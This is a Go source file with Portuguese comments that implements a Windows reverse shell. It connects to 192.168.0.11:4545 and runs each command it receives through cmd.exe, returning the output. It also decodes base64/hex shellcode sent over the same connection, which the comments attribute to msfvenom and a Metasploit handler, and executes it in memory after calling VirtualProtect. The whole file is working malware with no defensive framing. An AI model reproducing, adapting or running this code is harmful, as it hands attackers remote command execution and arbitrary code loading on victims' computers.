package main

import (
	"bufio"
	b64 "encoding/base64"
	"encoding/hex"
	"fmt"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
)

// aloca shellcode na memoria
//o viso de que (NewLazyDLL) Not Declared, vai acontecer se vc estiver usando linux
//pelo fato do linux nao possuir bibliotecas -> kernel32.dll
var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

// funcao de alocacao
func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func shellcode(codePelaRede string) {
	//shell code em hexadecimal, msfvenom, ip=192.168.0.11 port=6666

	codeRedeDescript := decriptar(codePelaRede)
	sc, err := hex.DecodeString(codeRedeDescript)

	if err != nil {
		fmt.Println(err)
	}

	f := func() {}

	var oldfperms uint32
	if !VirtualProtect(
		unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), // O ponteiro para nossa função f () (lpAddress)
		unsafe.Sizeof(uintptr(0)),                        // O tamanho dos atributos de proteção de acesso a serem alterados (dwSize)
		uint32(0x40),                                     // Nossa nova permissão de acesso à memória 0x40 FULL ACCESS
		unsafe.Pointer(&oldfperms)) {                     // Armazene nossas permissões antigas na var do oldfperms
		panic("Call to VirtualProtect failed!")
	}

	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Call to VirtualProtect failed!")
	}

	f()
}

//fim da alocacao de shellcode na memoria

func decriptar(dados string) string {
	//sEnc := b64.StdEncoding.EncodeToString([]byte(dados))
	//fmt.Println(sEnc)

	sDec, _ := b64.StdEncoding.DecodeString(dados)
	//converter para string para visualizar em texto legivel
	return string(sDec)
}

// shelreverse simples
func shelReverse() {
	conn, _ := net.Dial("tcp", "192.168.0.11:4545")
	for {

		message, _ := bufio.NewReader(conn).ReadString('\n')
		out, err := exec.Command("cmd", "/C", message).Output()
		if len(message) > 100 {
			//Recebdo shell code pela rede
			fmt.Fprintf(conn, "%s\n", "Shell Code Metasploit Enviado Pela Rede Iniciado...\nOlhe seu Mult Handler\n")
			shellcode(message)
		}

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s\n", out)

	}
}
func main() {
	shelReverse()
}
